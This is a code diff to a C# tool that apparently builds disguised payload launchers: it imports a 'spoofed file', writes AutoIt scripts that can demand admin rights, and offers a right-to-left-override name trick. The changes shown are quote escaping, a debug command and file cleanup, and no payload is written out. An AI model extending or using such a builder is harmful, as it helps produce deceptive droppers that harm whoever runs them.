@@ -191,8 +191,12 @@ namespace masamangalternatibo {
                     dbgmsg("result:" + testNet(con[1]));
                     break;
 
+                case "rep":
+                    dbgmsg("result: " + con[1].Replace("\"", "\"\""));
+                    break;
+
                 default:
-                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\noverflowdebugmsg\ncheckcomp [name] [filename] [size] [link] [desc]\nteststrformat [string] [data]\nformsetwidth [integer]\ncleanup\nshowallui\nrtlo [string]\ngetserial [drive]\ntestnet [address]\ncls\nexit\n");
+                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\noverflowdebugmsg\ncheckcomp [name] [filename] [size] [link] [desc]\nteststrformat [string] [data]\nformsetwidth [integer]\ncleanup\nshowallui\nrtlo [string]\ngetserial [drive]\ntestnet [address]\nrep [string]\ncls\nexit\n");
                     break;
             }
             tbConsole.Text = "";
@@ -432,13 +436,11 @@ namespace masamangalternatibo {
                 }
 
                 dbgmsg("Importing spoofed file...");
-                if (File.Exists("$spooftmp")) File.Delete("$spooftmp");
-                File.Copy(ofdSpoof.FileName, "$spooftmp");
-
-                //Properly escape the strings at write (Implemented in v0.13.0a)
-                if (chkArguments.Checked && chkArguments.Text != "") {
-                    chkArguments.Text.Replace("\"", "\"\"");
+                if (File.Exists("$spooftmp")) {
+                    File.SetAttributes("$spooftmp", FileAttributes.Normal);
+                    File.Delete("$spooftmp");
                 }
+                File.Copy(ofdSpoof.FileName, "$spooftmp");
 
                 /*
                  * scriptData Array String Variable - Stores the temporary data to be written in the script through String.Format
@@ -463,7 +465,7 @@ namespace masamangalternatibo {
                     templateData,
 
                     (chkAdminFlag.Checked ? "#RequireAdmin" : null),
-                    ((payloadMode != 2) ? (chkArguments.Checked ? tbArguments.Text : null) : tbPayload.Text),
+                    ((payloadMode != 2) ? (chkArguments.Checked ? parseEscapeQuotes(tbArguments.Text) : null) : parseEscapeQuotes(tbPayload.Text)),
                     ((payloadMode == 0 && chkConsole.Checked) ? "true" : "false"),
                     ((payloadMode == 0 && chkConsole.Checked && chkStreamConsole.Checked) ? "true" : "false"),
                     ((payloadMode == 0 && chkTarExe.Checked) ? "true" : "false"),
@@ -525,6 +527,7 @@ namespace masamangalternatibo {
                 char x = b[0];
                 if (x == '$') {
                     dbgmsg("Deleting: " + b);
+                    File.SetAttributes(i, FileAttributes.Normal);
                     File.Delete(i);
                 }
             }
@@ -539,8 +542,7 @@ namespace masamangalternatibo {
         private void loadDrives() {
             dbgmsg("Scanning for drives...");
             drpDrives.Items.Clear();
-            DriveInfo[] _di = DriveInfo.GetDrives();
-            foreach (DriveInfo drivenm in _di) {
+            foreach (DriveInfo drivenm in DriveInfo.GetDrives()) {
                 if (drivenm.IsReady && drivenm.Name != @"C:\") {
                     drpDrives.Items.Add(drivenm.Name);
                 }
@@ -606,6 +608,19 @@ namespace masamangalternatibo {
             }
             if (_ret == false && showerror) MessageBox.Show("An error occured while attempting to create a connection, Please check your network!", "Network Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
             return _ret;
+        }
+
+        /*
+         * Parse Escape Quotation - Parses a string for quotation marks and properly escapes them for AutoIt
+         * --------------------------------------------------------------------------------------------------
+         * parseEscapeQuotes(
+         *          String to parse (string)
+         * )
+         * --------------------------------------------------------------------------------------------------
+         * returns: The parsed string
+         */
+        private string parseEscapeQuotes(string str) {
+            return str.Replace("\"", "\"\"");
         }
 
         //Button Switch Mode - Allows the user to switch between payload modes
